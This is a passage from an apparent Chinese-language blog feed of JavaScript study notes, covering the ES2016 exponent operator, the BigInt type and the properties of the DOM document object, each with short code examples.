<li><code>Math.tanh(x)</code> 返回<code>x</code>的双曲正切（hyperbolic tangent）</li>
<li><code>Math.asinh(x)</code> 返回<code>x</code>的反双曲正弦（inverse hyperbolic sine）</li>
<li><code>Math.acosh(x)</code> 返回<code>x</code>的反双曲余弦（inverse hyperbolic cosine）</li>
<li><code>Math.atanh(x)</code> 返回<code>x</code>的反双曲正切（inverse hyperbolic tangent）</li>
</ul>
<h4 id="7-8-指数运算符"><a href="#7-8-指数运算符" class="headerlink" title="7.8 指数运算符"></a>7.8 指数运算符</h4><p>ES2016 新增了一个指数运算符（<code>**</code>）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span> ** <span class="number">2</span> <span class="comment">// 4</span></span><br><span class="line"><span class="number">2</span> ** <span class="number">3</span> <span class="comment">// 8</span></span><br></pre></td></tr></table></figure>
<p>这个运算符的一个特点是右结合，而不是常见的左结合。多个指数运算符连用时，是从最右边开始计算的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 相当于 2 ** (3 ** 2)</span></span><br><span class="line"><span class="number">2</span> ** <span class="number">3</span> ** <span class="number">2</span></span><br><span class="line"><span class="comment">// 512</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，首先计算的是第二个指数运算符，而不是第一个。</p>
<p>指数运算符可以与等号结合，形成一个新的赋值运算符（<code>**=</code>）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">1.5</span>;</span><br><span class="line">a **= <span class="number">2</span>;</span><br><span class="line"><span class="comment">// 等同于 a = a * a;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = <span class="number">4</span>;</span><br><span class="line">b **= <span class="number">3</span>;</span><br><span class="line"><span class="comment">// 等同于 b = b * b * b;</span></span><br></pre></td></tr></table></figure>
<h4 id="7-9-BigInt-数据类型"><a href="#7-9-BigInt-数据类型" class="headerlink" title="7.9 BigInt 数据类型"></a>7.9 BigInt 数据类型</h4><h5 id="7-9-1-简介"><a href="#7-9-1-简介" class="headerlink" title="7.9.1 简介"></a>7.9.1 简介</h5><p>JavaScript 所有数字都保存成 64 位浮点数，这给数值的表示带来了两大限制。一是数值的精度只能到 53 个二进制位（相当于 16 个十进制位），大于这个范围的整数，JavaScript 是无法精确表示的，这使得 JavaScript 不适合进行科学和金融方面的精确计算。二是大于或等于2的1024次方的数值，JavaScript 无法表示，会返回<code>Infinity</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 超过 53 个二进制位的数值，无法保持精度</span></span><br><span class="line"><span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">53</span>) === <span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">53</span>) + <span class="number">1</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 超过 2 的 1024 次方的数值，无法表示</span></span><br><span class="line"><span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">1024</span>) <span class="comment">// Infinity</span></span><br></pre></td></tr></table></figure>
<p>ES2020 引入了一种新的数据类型 BigInt（大整数），来解决这个问题，这是 ECMAScript 的第八种数据类型。BigInt 只用来表示整数，没有位数的限制，任何位数的整数都可以精确表示。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = <span class="number">2172141653n</span>;</span><br><span class="line"><span class="keyword">const</span> b = <span class="number">15346349309n</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// BigInt 可以保持精度</span></span><br><span class="line">a * b <span class="comment">// 33334444555566667777n</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 普通整数无法保持精度</span></span><br><span class="line"><span class="built_in">Number</span>(a) * <span class="built_in">Number</span>(b) <span class="comment">// 33334444555566670000</span></span><br></pre></td></tr></table></figure>
<p>为了与 Number 类型区别，BigInt 类型的数据必须添加后缀<code>n</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1234</span> <span class="comment">// 普通整数</span></span><br><span class="line"><span class="number">1234n</span> <span class="comment">// BigInt</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// BigInt 的运算</span></span><br><span class="line"><span class="number">1n</span> + <span class="number">2n</span> <span class="comment">// 3n</span></span><br></pre></td></tr></table></figure>
<p>BigInt 同样可以使用各种进制表示，都要加上后缀<code>n</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">0b1101n</span> <span class="comment">// 二进制</span></span><br><span class="line"><span class="number">0o777n</span> <span class="comment">// 八进制</span></span><br><span class="line"><span class="number">0xFFn</span> <span class="comment">// 十六进制</span></span><br></pre></td></tr></table></figure>
<p>BigInt 与普通整数是两种值，它们之间并不相等。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">42n</span> === <span class="number">42</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p><code>typeof</code>运算符对于 BigInt 类型的数据返回<code>bigint</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="number">123n</span> <span class="comment">// &#x27;bigint&#x27;</span></span><br></pre></td></tr></table></figure>
<p>BigInt 可以使用负号（<code>-</code>），但是不能使用正号（<code>+</code>），因为会与 asm.js 冲突。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">-<span class="number">42n</span> <span class="comment">// 正确</span></span><br><span class="line">+<span class="number">42n</span> <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure>
<p>JavaScript 以前不能计算70的阶乘（即<code>70!</code>），因为超出了可以表示的精度。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt;= <span class="number">70</span>; i++) &#123;</span><br><span class="line">  p *= i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(p); <span class="comment">// 1.197857166996989e+100</span></span><br></pre></td></tr></table></figure>
<p>现在支持大整数了，就可以算了，浏览器的开发者工具运行下面代码，就OK。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="number">1n</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1n</span>; i &lt;= <span class="number">70n</span>; i++) &#123;</span><br><span class="line">  p *= i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(p); <span class="comment">// 11978571...00000000n</span></span><br></pre></td></tr></table></figure>
<h5 id="7-9-2-BigInt-对象"><a href="#7-9-2-BigInt-对象" class="headerlink" title="7.9.2 BigInt 对象"></a>7.9.2 BigInt 对象</h5><p>JavaScript 原生提供<code>BigInt</code>对象，可以用作构造函数生成 BigInt 类型的数值。转换规则基本与<code>Number()</code>一致，将其他类型的值转为 BigInt。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">BigInt</span>(<span class="number">123</span>) <span class="comment">// 123n</span></span><br><span class="line"><span class="built_in">BigInt</span>(<span class="string">&#x27;123&#x27;</span>) <span class="comment">// 123n</span></span><br><span class="line"><span class="built_in">BigInt</span>(<span class="literal">false</span>) <span class="comment">// 0n</span></span><br><span class="line"><span class="built_in">BigInt</span>(<span class="literal">true</span>) <span class="comment">// 1n</span></span><br></pre></td></tr></table></figure>
<p><code>BigInt()</code>构造函数必须有参数，而且参数必须可以正常转为数值，下面的用法都会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">BigInt</span>() <span class="comment">// TypeError</span></span><br><span class="line"><span class="built_in">BigInt</span>(<span class="literal">undefined</span>) <span class="comment">//TypeError</span></span><br><span class="line"><span class="built_in">BigInt</span>(<span class="literal">null</span>) <span class="comment">// TypeError</span></span><br><span class="line"><span class="built_in">BigInt</span>(<span class="string">&#x27;123n&#x27;</span>) <span class="comment">// SyntaxError</span></span><br><span class="line"><span class="built_in">BigInt</span>(<span class="string">&#x27;abc&#x27;</span>) <span class="comment">// SyntaxError</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，尤其值得注意字符串<code>123n</code>无法解析成 Number 类型，所以会报错。</p>
<p>参数如果是小数，也会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">BigInt</span>(<span class="number">1.5</span>) <span class="comment">// RangeError</span></span><br><span class="line"><span class="built_in">BigInt</span>(<span class="string">&#x27;1.5&#x27;</span>) <span class="comment">// SyntaxError</span></span><br></pre></td></tr></table></figure>
<p>BigInt 对象继承了 Object 对象的两个实例方法。</p>
<ul>
<li><code>BigInt.prototype.toString()</code></li>
<li><code>BigInt.prototype.valueOf()</code></li>
</ul>
<p>它还继承了 Number 对象的一个实例方法。</p>
<ul>
<li><code>BigInt.prototype.toLocaleString()</code></li>
</ul>
<p>此外，还提供了三个静态方法。</p>
<ul>
<li><code>BigInt.asUintN(width, BigInt)</code>： 给定的 BigInt 转为 0 到 2width - 1 之间对应的值。</li>
<li><code>BigInt.asIntN(width, BigInt)</code>：给定的 BigInt 转为 -2width - 1 到 2width - 1 - 1 之间对应的值。</li>
<li><code>BigInt.parseInt(string[, radix])</code>：近似于<code>Number.parseInt()</code>，将一个字符串转换成指定进制的 BigInt。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> max = <span class="number">2n</span> ** (<span class="number">64n</span> - <span class="number">1n</span>) - <span class="number">1n</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">BigInt</span>.asIntN(<span class="number">64</span>, max)</span><br><span class="line"><span class="comment">// 9223372036854775807n</span></span><br><span class="line"><span class="built_in">BigInt</span>.asIntN(<span class="number">64</span>, max + <span class="number">1n</span>)</span><br><span class="line"><span class="comment">// -9223372036854775808n</span></span><br><span class="line"><span class="built_in">BigInt</span>.asUintN(<span class="number">64</span>, max + <span class="number">1n</span>)</span><br><span class="line"><span class="comment">// 9223372036854775808n</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>max</code>是64位带符号的 BigInt 所能表示的最大值。如果对这个值加<code>1n</code>，<code>BigInt.asIntN()</code>将会返回一个负值，因为这时新增的一位将被解释为符号位。而<code>BigInt.asUintN()</code>方法由于不存在符号位，所以可以正确返回结果。</p>
<p>如果<code>BigInt.asIntN()</code>和<code>BigInt.asUintN()</code>指定的位数，小于数值本身的位数，那么头部的位将被舍弃。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> max = <span class="number">2n</span> ** (<span class="number">64n</span> - <span class="number">1n</span>) - <span class="number">1n</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">BigInt</span>.asIntN(<span class="number">32</span>, max) <span class="comment">// -1n</span></span><br><span class="line"><span class="built_in">BigInt</span>.asUintN(<span class="number">32</span>, max) <span class="comment">// 4294967295n</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>max</code>是一个64位的 BigInt，如果转为32位，前面的32位都会被舍弃。</p>
<p>下面是<code>BigInt.parseInt()</code>的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Number.parseInt() 与 BigInt.parseInt() 的对比</span></span><br><span class="line"><span class="built_in">Number</span>.parseInt(<span class="string">&#x27;9007199254740993&#x27;</span>, <span class="number">10</span>)</span><br><span class="line"><span class="comment">// 9007199254740992</span></span><br><span class="line"><span class="built_in">BigInt</span>.parseInt(<span class="string">&#x27;9007199254740993&#x27;</span>, <span class="number">10</span>)</span><br><span class="line"><span class="comment">// 9007199254740993n</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，由于有效数字超出了最大限度，<code>Number.parseInt</code>方法返回的结果是不精确的，而<code>BigInt.parseInt</code>方法正确返回了对应的 BigInt。</p>
<p>对于二进制数组，BigInt 新增了两个类型<code>BigUint64Array</code>和<code>BigInt64Array</code>，这两种数据类型返回的都是64位 BigInt。<code>DataView</code>对象的实例方法<code>DataView.prototype.getBigInt64()</code>和<code>DataView.prototype.getBigUint64()</code>，返回的也是 BigInt。</p>
<h5 id="7-9-3-转换规则"><a href="#7-9-3-转换规则" class="headerlink" title="7.9.3 转换规则"></a>7.9.3 转换规则</h5><p>可以使用<code>Boolean()</code>、<code>Number()</code>和<code>String()</code>这三个方法，将 BigInt 可以转为布尔值、数值和字符串类型。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Boolean</span>(<span class="number">0n</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Boolean</span>(<span class="number">1n</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="number">1n</span>)  <span class="comment">// 1</span></span><br><span class="line"><span class="built_in">String</span>(<span class="number">1n</span>)  <span class="comment">// &quot;1&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，注意最后一个例子，转为字符串时后缀<code>n</code>会消失。</p>
<p>另外，取反运算符（<code>!</code>）也可以将 BigInt 转为布尔值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">!<span class="number">0n</span> <span class="comment">// true</span></span><br><span class="line">!<span class="number">1n</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h5 id="7-9-4-数学运算"><a href="#7-9-4-数学运算" class="headerlink" title="7.9.4 数学运算"></a>7.9.4 数学运算</h5><p>数学运算方面，BigInt 类型的<code>+</code>、<code>-</code>、<code>*</code>和<code>**</code>这四个二元运算符，与 Number 类型的行为一致。除法运算<code>/</code>会舍去小数部分，返回一个整数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">9n</span> / <span class="number">5n</span></span><br><span class="line"><span class="comment">// 1n</span></span><br></pre></td></tr></table></figure>
<p>几乎所有的数值运算符都可以用在 BigInt，但是有两个例外。</p>
<ul>
<li>不带符号的右移位运算符<code>&gt;&gt;&gt;</code></li>
<li>一元的求正运算符<code>+</code></li>
</ul>
<p>上面两个运算符用在 BigInt 会报错。前者是因为<code>&gt;&gt;&gt;</code>运算符是不带符号的，但是 BigInt 总是带有符号的，导致该运算无意义，完全等同于右移运算符<code>&gt;&gt;</code>。后者是因为一元运算符<code>+</code>在 asm.js 里面总是返回 Number 类型，为了不破坏 asm.js 就规定<code>+1n</code>会报错。</p>
<p>BigInt 不能与普通数值进行混合运算。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1n</span> + <span class="number">1.3</span> <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure>
<p>上面代码报错是因为无论返回的是 BigInt 或 Number，都会导致丢失精度信息。比如<code>(2n**53n + 1n) + 0.5</code>这个表达式，如果返回 BigInt 类型，<code>0.5</code>这个小数部分会丢失；如果返回 Number 类型，有效精度只能保持 53 位，导致精度下降。</p>
<p>同样的原因，如果一个标准库函数的参数预期是 Number 类型，但是得到的是一个 BigInt，就会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 错误的写法</span></span><br><span class="line"><span class="built_in">Math</span>.sqrt(<span class="number">4n</span>) <span class="comment">// 报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确的写法</span></span><br><span class="line"><span class="built_in">Math</span>.sqrt(<span class="built_in">Number</span>(<span class="number">4n</span>)) <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>Math.sqrt</code>的参数预期是 Number 类型，如果是 BigInt 就会报错，必须先用<code>Number</code>方法转一下类型，才能进行计算。</p>
<p>asm.js 里面，<code>|0</code>跟在一个数值的后面会返回一个32位整数。根据不能与 Number 类型混合运算的规则，BigInt 如果与<code>|0</code>进行运算会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1n</span> | <span class="number">0</span> <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure>
<h5 id="7-9-5-其他运算"><a href="#7-9-5-其他运算" class="headerlink" title="7.9.5 其他运算"></a>7.9.5 其他运算</h5><p>BigInt 对应的布尔值，与 Number 类型一致，即<code>0n</code>会转为<code>false</code>，其他值转为<code>true</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="number">0n</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;if&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;else&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// else</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>0n</code>对应<code>false</code>，所以会进入<code>else</code>子句。</p>
<p>比较运算符（比如<code>&gt;</code>）和相等运算符（<code>==</code>）允许 BigInt 与其他类型的值混合计算，因为这样做不会损失精度。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">0n</span> &lt; <span class="number">1</span> <span class="comment">// true</span></span><br><span class="line"><span class="number">0n</span> &lt; <span class="literal">true</span> <span class="comment">// true</span></span><br><span class="line"><span class="number">0n</span> == <span class="number">0</span> <span class="comment">// true</span></span><br><span class="line"><span class="number">0n</span> == <span class="literal">false</span> <span class="comment">// true</span></span><br><span class="line"><span class="number">0n</span> === <span class="number">0</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>BigInt 与字符串混合运算时，会先转为字符串，再进行运算。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span> + <span class="number">123n</span> <span class="comment">// &quot;123&quot;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JS-ES6</category>
      </categories>
      <tags>
        <tag>JS-ES6 数值的扩展</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0038</title>
    <url>/2021/05/24/%E6%89%93%E5%8D%A10038/</url>
    <content><![CDATA[<p><font color=#987165>人海茫茫，能够相遇本来就是难得的缘分，愿我们都能够以体谅之心爱人，不敷衍每一份真情，互相体谅，好好珍惜。</font></p>
<h2 id="JS-DOM"><a href="#JS-DOM" class="headerlink" title="JS DOM"></a>JS DOM</h2><h3 id="5-Document-节点"><a href="#5-Document-节点" class="headerlink" title="5. Document 节点"></a>5. Document 节点</h3><h4 id="5-1-概述"><a href="#5-1-概述" class="headerlink" title="5.1 概述"></a>5.1 概述</h4><p><code>document</code>节点对象代表整个文档，每张网页都有自己的<code>document</code>对象。<code>window.document</code>属性就指向这个对象。只要浏览器开始载入 HTML 文档，该对象就存在了，可以直接使用。</p>
<p><code>document</code>对象有不同的办法可以获取。</p>
<ul>
<li>正常的网页，直接使用<code>document</code>或<code>window.document</code>。</li>
<li><code>iframe</code>框架里面的网页，使用<code>iframe</code>节点的<code>contentDocument</code>属性 。</li>
<li>Ajax 操作返回的文档，使用<code>XMLHttpRequest</code>对象的<code>responseXML</code>属性。</li>
<li>内部节点的<code>ownerDocument</code>属性。</li>
</ul>
<p><code>document</code>对象继承了<code>EventTarget</code>接口和<code>Node</code>接口，并且混入（mixin）了<code>ParentNode</code>接口。这意味着，这些接口的方法都可以在<code>document</code>对象上调用。除此之外，<code>document</code>对象还有很多自己的属性和方法。</p>
<span id="more"></span>
<h4 id="5-2-属性"><a href="#5-2-属性" class="headerlink" title="5.2 属性"></a>5.2 属性</h4><h5 id="5-2-1-快捷方式属性"><a href="#5-2-1-快捷方式属性" class="headerlink" title="5.2.1 快捷方式属性"></a>5.2.1 快捷方式属性</h5><p>以下属性是指向文档内部的某个节点的快捷方式。</p>
<h6 id="1-document-defaultView"><a href="#1-document-defaultView" class="headerlink" title="(1) document.defaultView"></a>(1) document.defaultView</h6><p><code>document.defaultView</code>属性返回<code>document</code>对象所属的<code>window</code>对象。如果当前文档不属于<code>window</code>对象，该属性返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.defaultView === <span class="built_in">window</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h6 id="2-document-doctype"><a href="#2-document-doctype" class="headerlink" title="(2) document.doctype"></a>(2) document.doctype</h6><p> 对于 HTML 文档来说，<code>document</code>对象一般有两个子节点。第一个子节点是<code>document.doctype</code>，指向<code>&lt;DOCTYPE&gt;</code>节点，即文档类型（Document Type Declaration，简写DTD）节点。HTML 的文档类型节点，一般写成<code>&lt;!DOCTYPE html&gt;</code>。如果网页没有声明 DTD，该属性返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> doctype = <span class="built_in">document</span>.doctype;</span><br><span class="line">doctype <span class="comment">// &quot;&lt;!DOCTYPE html&gt;&quot;</span></span><br><span class="line">doctype.name <span class="comment">// &quot;html&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>document.firstChild</code>通常就返回这个节点。</p>
<h6 id="3-document-documentElement"><a href="#3-document-documentElement" class="headerlink" title="(3) document.documentElement"></a>(3) document.documentElement</h6><p><code>document.documentElement</code>属性返回当前文档的根元素节点（root）。它通常是<code>document</code>节点的第二个子节点，紧跟在<code>document.doctype</code>节点后面。HTML网页的该属性，一般是<code>&lt;html&gt;</code>节点。</p>
<h6 id="4-document-body，document-head"><a href="#4-document-body，document-head" class="headerlink" title="(4) document.body，document.head"></a>(4) document.body，document.head</h6><p><code>document.body</code>属性指向<code>&lt;body&gt;</code>节点，<code>document.head</code>属性指向<code>&lt;head&gt;</code>节点。<br>这两个属性总是存在的，如果网页源码里面省略了<code>&lt;head&gt;</code>或<code>&lt;body&gt;</code>，浏览器会自动创建。另外，这两个属性是可写的，如果改写它们的值，相当于移除所有子节点。</p>
<h6 id="5-document-scrollingElement"><a href="#5-document-scrollingElement" class="headerlink" title="(5) document.scrollingElement"></a>(5) document.scrollingElement</h6><p><code>document.scrollingElement</code>属性返回文档的滚动元素。也就是说，当文档整体滚动时，到底是哪个元素在滚动。</p>
<p>标准模式下，这个属性返回的文档的根元素<code>document.documentElement</code>（即<code>&lt;html&gt;</code>）。兼容（quirk）模式下，返回的是<code>&lt;body&gt;</code>元素，如果该元素不存在，返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 页面滚动到浏览器顶部</span></span><br><span class="line"><span class="built_in">document</span>.scrollingElement.scrollTop = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h6 id="6-document-activeElement"><a href="#6-document-activeElement" class="headerlink" title="(6) document.activeElement"></a>(6) document.activeElement</h6><p><code>document.activeElement</code>属性返回获得当前焦点（focus）的 DOM 元素。通常，这个属性返回的是<code>&lt;input&gt;</code>、<code>&lt;textarea&gt;</code>、<code>&lt;select&gt;</code>等表单元素，如果当前没有焦点元素，返回<code>&lt;body&gt;</code>元素或<code>null</code>。</p>
<h6 id="7-document-fullscreenElement"><a href="#7-document-fullscreenElement" class="headerlink" title="(7) document.fullscreenElement"></a>(7) document.fullscreenElement</h6><p><code>document.fullscreenElement</code>属性返回当前以全屏状态展示的 DOM 元素。如果不是全屏状态，该属性返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.fullscreenElement.nodeName == <span class="string">&#x27;VIDEO&#x27;</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;全屏播放视频&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，通过<code>document.fullscreenElement</code>可以知道<code>&lt;video&gt;</code>元素有没有处在全屏状态，从而判断用户行为。</p>
<h5 id="5-2-2-节点集合属性"><a href="#5-2-2-节点集合属性" class="headerlink" title="5.2.2 节点集合属性"></a>5.2.2 节点集合属性</h5><p>以下属性返回一个<code>HTMLCollection</code>实例，表示文档内部特定元素的集合。这些集合都是动态的，原节点有任何变化，立刻会反映在集合中。</p>
<h6 id="1-document-links"><a href="#1-document-links" class="headerlink" title="(1) document.links"></a>(1) document.links</h6><p><code>document.links</code>属性返回当前文档所有设定了<code>href</code>属性的<code>&lt;a&gt;</code>及<code>&lt;area&gt;</code>节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 打印文档所有的链接</span></span><br><span class="line"><span class="keyword">var</span> links = <span class="built_in">document</span>.links;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; links.length; i++) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(links[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="2-document-forms"><a href="#2-document-forms" class="headerlink" title="(2)document.forms"></a>(2)document.forms</h6><p><code>document.forms</code>属性返回所有<code>&lt;form&gt;</code>表单节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> selectForm = <span class="built_in">document</span>.forms[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
<p>上面代码获取文档第一个表单。</p>
<p>除了使用位置序号，<code>id</code>属性和<code>name</code>属性也可以用来引用表单。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* HTML 代码如下</span></span><br><span class="line"><span class="comment">  &lt;form name=&quot;foo&quot; id=&quot;bar&quot;&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">document</span>.forms[<span class="number">0</span>] === <span class="built_in">document</span>.forms.foo <span class="comment">// true</span></span><br><span class="line"><span class="built_in">document</span>.forms.bar === <span class="built_in">document</span>.forms.foo <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h6 id="3-document-images"><a href="#3-document-images" class="headerlink" title="(3) document.images"></a>(3) document.images</h6><p><code>document.images</code>属性返回页面所有<code>&lt;img&gt;</code>图片节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> imglist = <span class="built_in">document</span>.images;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; imglist.length; i++) &#123;</span><br><span class="line">  <span class="keyword">if</span> (imglist[i].src === <span class="string">&#x27;banner.gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码在所有<code>img</code>标签中，寻找某张图片。</p>
<h6 id="4-document-embeds，document-plugins"><a href="#4-document-embeds，document-plugins" class="headerlink" title="(4) document.embeds，document.plugins"></a>(4) document.embeds，document.plugins</h6><p><code>document.embeds</code>属性和<code>document.plugins</code>属性，都返回所有<code>&lt;embed&gt;</code>节点。</p>
<h6 id="5-document-scripts"><a href="#5-document-scripts" class="headerlink" title="(5) document.scripts"></a>(5) document.scripts</h6><p><code>document.scripts</code>属性返回所有<code>&lt;script&gt;</code>节点。 </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> scripts = <span class="built_in">document</span>.scripts;</span><br><span class="line"><span class="keyword">if</span> (scripts.length !== <span class="number">0</span> ) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;当前网页有脚本&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="6-document-styleSheets"><a href="#6-document-styleSheets" class="headerlink" title="(6) document.styleSheets"></a>(6) document.styleSheets</h6><p><code>document.styleSheets</code>属性返回文档内嵌或引入的样式表集合，详细介绍请看《CSS 对象模型》一章。</p>
<h6 id="7-小结"><a href="#7-小结" class="headerlink" title="(7) 小结"></a>(7) 小结</h6><p> 除了<code>document.styleSheets</code>，以上的集合属性返回的都是<code>HTMLCollection</code>实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.links <span class="keyword">instanceof</span> HTMLCollection <span class="comment">// true</span></span><br><span class="line"><span class="built_in">document</span>.images <span class="keyword">instanceof</span> HTMLCollection <span class="comment">// true</span></span><br><span class="line"><span class="built_in">document</span>.forms <span class="keyword">instanceof</span> HTMLCollection <span class="comment">// true</span></span><br><span class="line"><span class="built_in">document</span>.embeds <span class="keyword">instanceof</span> HTMLCollection <span class="comment">// true</span></span><br><span class="line"><span class="built_in">document</span>.scripts <span class="keyword">instanceof</span> HTMLCollection <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p><code>HTMLCollection</code>实例是类似数组的对象，所以这些属性都有<code>length</code>属性，都可以使用方括号运算符引用成员。如果成员有<code>id</code>或<code>name</code>属性，还可以用这两个属性的值，在<code>HTMLCollection</code>实例上引用到这个成员。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;form name=&quot;myForm&quot;&gt;</span></span><br><span class="line"><span class="built_in">document</span>.myForm === <span class="built_in">document</span>.forms.myForm <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h5 id="5-2-3-文档静态信息属性"><a href="#5-2-3-文档静态信息属性" class="headerlink" title="5.2.3 文档静态信息属性"></a>5.2.3 文档静态信息属性</h5><p>以下属性返回文档信息。</p>
<h6 id="1-document-documentURI，document-URL"><a href="#1-document-documentURI，document-URL" class="headerlink" title="(1)document.documentURI，document.URL"></a>(1)document.documentURI，document.URL</h6><p><code>document.documentURI</code>属性和<code>document.URL</code>属性都返回一个字符串，表示当前文档的网址。不同之处是它们继承自不同的接口，<code>documentURI</code>继承自<code>Document</code>接口，可用于所有文档；URL继承自<code>HTMLDocument</code>接口，只能用于 HTML 文档。</p>
